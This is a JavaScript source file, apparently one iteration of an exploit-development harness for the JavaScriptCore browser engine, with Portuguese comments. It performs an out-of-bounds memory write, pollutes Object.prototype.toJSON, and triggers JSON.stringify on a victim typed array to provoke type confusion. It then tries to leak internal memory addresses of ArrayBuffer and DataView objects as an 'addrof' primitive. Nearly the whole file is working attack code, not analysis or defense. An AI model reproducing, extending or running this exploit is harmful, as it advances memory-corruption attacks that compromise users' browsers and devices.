// js/script3/testArrayBufferVictimCrash.mjs (v57_TargetInjectedTypedArrays)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V57_TITA = "OriginalHeisenbug_TypedArrayAddrof_v57_TargetInjectedTypedArrays";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let leak_target_buffer_v57 = null;
let leak_target_dataview_v57 = null;

let victim_typed_array_ref_v57 = null;
let probe_call_count_v57 = 0;
let all_probe_interaction_details_v57 = [];
let first_call_details_object_ref_v57 = null;

const PROBE_CALL_LIMIT_V57 = 10;

function toJSON_TA_Probe_TargetInjectedTypedArrays_v57() {
    probe_call_count_v57++;
    const call_num = probe_call_count_v57;
    let current_call_details = {
        call_number: call_num,
        probe_variant: FNAME_MODULE_TYPEDARRAY_ADDROF_V57_TITA,
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v57),
        this_is_C1_details_obj: (this === first_call_details_object_ref_v57 && first_call_details_object_ref_v57 !== null),
        this_is_leak_target_AB: (this === leak_target_buffer_v57 && leak_target_buffer_v57 !== null),
        this_is_leak_target_DV: (this === leak_target_dataview_v57 && leak_target_dataview_v57 !== null),
        C1_payloads_assigned: false,
        addrof_read_val: null,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. Type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1? ${current_call_details.this_is_C1_details_obj}. IsLeakAB? ${current_call_details.this_is_leak_target_AB}. IsLeakDV? ${current_call_details.this_is_leak_target_DV}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V57) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit.`, "warn");
            all_probe_interaction_details_v57.push(current_call_details);
            return { recursion_stopped_v57: true, call: call_num };
        }

        // Caso 1: 'this' é a vítima original (primeira chamada)
        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Storing C1_details ref.`, "info");
            first_call_details_object_ref_v57 = current_call_details;
            all_probe_interaction_details_v57.push(current_call_details);
            return current_call_details; // Retorna C1_details
        }
        // Caso 2: 'this' é o C1_details (type-confused)
        else if (current_call_details.this_is_C1_details_obj && current_call_details.this_type === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION ON C1_DETAILS_OBJECT ('this')! Assigning leak target TypedArrays...`, "vuln");
            if (leak_target_buffer_v57) {
                this.payload_ArrayBuffer = leak_target_buffer_v57; // Atribui o ArrayBuffer
                current_call_details.C1_payloads_assigned = true;
            }
            if (leak_target_dataview_v57) {
                this.payload_DataView = leak_target_dataview_v57; // Atribui o DataView
                current_call_details.C1_payloads_assigned = true;
            }
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: C1_details modified. Keys: ${Object.keys(this).join(',')}`, "info");
            all_probe_interaction_details_v57.push(current_call_details);
            return this; // Retorna C1_details modificado
        }
        // Caso 3: 'this' é o ArrayBuffer que injetamos
        else if (current_call_details.this_is_leak_target_AB && current_call_details.this_type === '[object ArrayBuffer]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS THE TARGET ArrayBuffer! Reading internal pointer...`, "critical");
            let leaked_val = null;
            try {
                let view_on_this_target = new DataView(this);
                const offset_to_read = JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET; // 0x10
                if (view_on_this_target.byteLength < (offset_to_read + 8)) {
                    throw new RangeError(`Target ArrayBuffer too small (${view_on_this_target.byteLength}b) for 8b read at ${toHex(offset_to_read)}.`);
                }
                let low = view_on_this_target.getUint32(offset_to_read, true);
                let high = view_on_this_target.getUint32(offset_to_read + 4, true);
                let int64_val = new AdvancedInt64(low, high);
                let temp_buffer = new ArrayBuffer(8); (new Uint32Array(temp_buffer))[0] = low; (new Uint32Array(temp_buffer))[1] = high;
                leaked_val = (new Float64Array(temp_buffer))[0];
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Read from TARGET ArrayBuffer at ${toHex(offset_to_read)}. Leaked: ${int64_val.toString(true)} (double: ${leaked_val})`, "vuln");
                current_call_details.addrof_read_val = leaked_val;
                all_probe_interaction_details_v57.push(current_call_details);
                return { leaked_address_v57: leaked_val, leaked_obj_type: '[object ArrayBuffer]', from_offset: toHex(offset_to_read) };
            } catch (e_leak) { /* ... (tratamento de erro) ... */ }
        }
        // Caso 4: 'this' é o DataView que injetamos
        else if (current_call_details.this_is_leak_target_DV && current_call_details.this_type === '[object DataView]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS THE TARGET DataView! Reading internal pointer...`, "critical");
            let leaked_val = null;
            try {
                let view_on_this_target = this;
                const offset_to_read = JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x10
                if (view_on_this_target.byteLength < (offset_to_read + 8)) {
                     throw new RangeError(`Target DataView too small (${view_on_this_target.byteLength}b) for 8b read at ${toHex(offset_to_read)}.`);
                }
                let low = view_on_this_target.getUint32(offset_to_read, true);
                let high = view_on_this_target.getUint32(offset_to_read + 4, true);
                let int64_val = new AdvancedInt64(low, high);
                let temp_buffer = new ArrayBuffer(8); (new Uint32Array(temp_buffer))[0] = low; (new Uint32Array(temp_buffer))[1] = high;
                leaked_val = (new Float64Array(temp_buffer))[0];
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Read from TARGET DataView at ${toHex(offset_to_read)}. Leaked: ${int64_val.toString(true)} (double: ${leaked_val})`, "vuln");
                current_call_details.addrof_read_val = leaked_val;
                all_probe_interaction_details_v57.push(current_call_details);
                return { leaked_address_v57: leaked_val, leaked_obj_type: '[object DataView]', from_offset: toHex(offset_to_read) };
            } catch (e_leak) { /* ... (tratamento de erro) ... */ }
        }
        // Caso 5: 'this' é um [object Object] genérico (não C1_details e não um dos alvos de leak)
        else if (current_call_details.this_type === '[object Object]') {
             logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is an UNEXPECTED [object Object]. Not modifying.`, "warn");
             all_probe_interaction_details_v57.push(current_call_details);
             return this; // Retornar para ver se é processado, mas sem modificá-lo.
        }
        // Caso 6: Outros tipos
        else {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is unexpected type: ${current_call_details.this_type}.`, "warn");
            all_probe_interaction_details_v57.push(current_call_details);
            return { generic_marker_v57: call_num };
        }
    } catch (e) {
        current_call_details.error_in_probe = e.message;
        const FNAME_CURRENT_TEST_REF = FNAME_MODULE_TYPEDARRAY_ADDROF_V57_TITA;
        logS3(`[${current_call_details.probe_variant}] Call #${call_num}: CRITICAL ERROR in probe: ${e.name} - ${e.message}`, "critical", FNAME_CURRENT_TEST_REF);
        all_probe_interaction_details_v57.push(current_call_details);
        return { error_marker_v57: call_num };
    }
}

export async function executeTypedArrayVictimAddrofTest_TargetInjectedTypedArrays() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V57_TITA}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (TargetInjectedTypedArrays) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V57_TITA} Init...`;

    probe_call_count_v57 = 0;
    all_probe_interaction_details_v57 = [];
    victim_typed_array_ref_v57 = null;
    first_call_details_object_ref_v57 = null;

    leak_target_buffer_v57 = new ArrayBuffer(0x80); // Tamanho robusto
    leak_target_dataview_v57 = new DataView(new ArrayBuffer(0x80));

    let errorCapturedMain = null;
    let rawStringifyOutput = null;
    let stringifyOutput_parsed = null;

    let addrof_A_result = { success: false, msg: "Addrof ArrayBuffer: Default (v57)" };
    let addrof_B_result = { success: false, msg: "Addrof DataView: Default (v57)" };
    const fillPattern = 0.57575757575757;

    let pollutionApplied = false;
    let originalToJSONDescriptor = null;
    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed. Value: ${toHex(OOB_WRITE_VALUE)}.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v57 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
        // ... preenchimento ...

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_TargetInjectedTypedArrays_v57, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.toJSON polluted. Calling JSON.stringify(victim_typed_array_ref_v57)...`, "info", FNAME_CURRENT_TEST);
            rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v57);
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);

            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput);
            } catch (e_parse) {
                logS3(`  Error parsing stringifyOutput: ${e_parse.message}. Expected if circular. Output: ${rawStringifyOutput}`, "warn");
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }

            let heisenbugOnC1AndPayloadsAssigned = false;
            const call2Details = all_probe_interaction_details_v57.find(d => d.call_number === 2 && d.this_is_C1_details_obj);
            if (call2Details && call2Details.C1_payloads_assigned) {
                heisenbugOnC1AndPayloadsAssigned = true;
                logS3(`  EXECUTE: HEISENBUG on C1_details (Call #2) & PAYLOAD ASSIGNMENT CONFIRMED!`, "vuln", FNAME_CURRENT_TEST);
            } else {
                logS3(`  EXECUTE: ALERT: Heisenbug on C1_details (Call #2) or payload assignment NOT confirmed.`, "error", FNAME_CURRENT_TEST);
            }

            let directLeakFromTypedArray = false;
            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object' && stringifyOutput_parsed.leaked_address_v57 !== undefined) {
                directLeakFromTypedArray = true; // Flag que um vazamento direto ocorreu
                const leaked_addr_val = stringifyOutput_parsed.leaked_address_v57;
                const obj_type = stringifyOutput_parsed.leaked_obj_type;
                const from_offset = stringifyOutput_parsed.from_offset;
                logS3(`  V57_ANALYSIS: Found 'leaked_address_v57' from probe case 3/4. Type: ${obj_type}, Offset: ${from_offset}`, "good");

                if (typeof leaked_addr_val === 'number' && !isNaN(leaked_addr_val) && leaked_addr_val !== 0) {
                    let p_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([leaked_addr_val]).buffer)[0], new Uint32Array(new Float64Array([leaked_addr_val]).buffer)[1]);
                    if (p_int64.high() > 0x70000000 || p_int64.low() > 0x10000000 || (p_int64.high() & 0xFF000000) === 0x80000000) {
                        if (obj_type === '[object ArrayBuffer]') {
                            addrof_A_result.success = true; addrof_A_result.msg = `V57 SUCCESS (Direct Read Target AB): ${p_int64.toString(true)} from ${from_offset}`;
                        } else if (obj_type === '[object DataView]') {
                            addrof_B_result.success = true; addrof_B_result.msg = `V57 SUCCESS (Direct Read Target DV): ${p_int64.toString(true)} from ${from_offset}`;
                        }
                    } else { /* Not a pointer pattern */ }
                } else { /* Not a useful number */ }
            }

            // Se o vazamento direto não ocorreu, mas C1 foi modificado, verificamos o C1 (embora menos provável de ter addrof)
            if (!directLeakFromTypedArray && stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object' && stringifyOutput_parsed.call_number === 1) {
                if (stringifyOutput_parsed.payload_ArrayBuffer && typeof stringifyOutput_parsed.payload_ArrayBuffer === 'object'){
                     addrof_A_result.msg = "V57 C1.payload_ArrayBuffer present as object, not numeric leak.";
                }
                if (stringifyOutput_parsed.payload_DataView && typeof stringifyOutput_parsed.payload_DataView === 'object'){
                     addrof_B_result.msg = "V57 C1.payload_DataView present as object, not numeric leak.";
                }
            } else if (!directLeakFromTypedArray) {
                 if (!addrof_A_result.success) addrof_A_result.msg = "V57 No direct leak from TypedArray & C1 structure not as expected in output.";
                 if (!addrof_B_result.success) addrof_B_result.msg = "V57 No direct leak from TypedArray & C1 structure not as expected in output.";
            }


            if (addrof_A_result.success || addrof_B_result.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V57_TITA}: Addr SUCCESS!`;
            } else if (heisenbugOnC1AndPayloadsAssigned || (stringifyOutput_parsed && stringifyOutput_parsed.parse_error && rawStringifyOutput.includes("circular structure"))) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V57_TITA}: Heisenbug OK, Addr Fail`;
            } else {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V57_TITA}: No Heisenbug?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`  CRITICAL ERROR during JSON.stringify or processing: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V57_TITA}: Stringify/Log ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
                logS3(`  Object.prototype.toJSON restored.`, "info", FNAME_CURRENT_TEST);
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`  CRITICAL ERROR in main test execution: ${e_outer_main.name} - ${e_outer_main.message}${e_outer_main.stack ? '\n'+e_outer_main.stack : ''}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V57_TITA} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v57}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A: Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B: Success=${addrof_B_result.success}, Msg='${addrof_B_result.msg}'`, addrof_B_result.success ? "good" : "warn", FNAME_CURRENT_TEST);

        victim_typed_array_ref_v57 = null;
        all_probe_interaction_details_v57 = [];
        probe_call_count_v57 = 0;
        first_call_details_object_ref_v57 = null;
        leak_target_buffer_v57 = null;
        leak_target_dataview_v57 = null;
    }
    return {
        errorCapturedMain: errorCapturedMain,
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError',
        stringifyResult: stringifyOutput_parsed,
        rawStringifyForAnalysis: rawStringifyOutput,
        all_probe_calls_for_analysis: [...all_probe_interaction_details_v57],
        total_probe_calls: probe_call_count_v57,
        addrof_A_result: addrof_A_result,
        addrof_B_result: addrof_B_result
    };
};
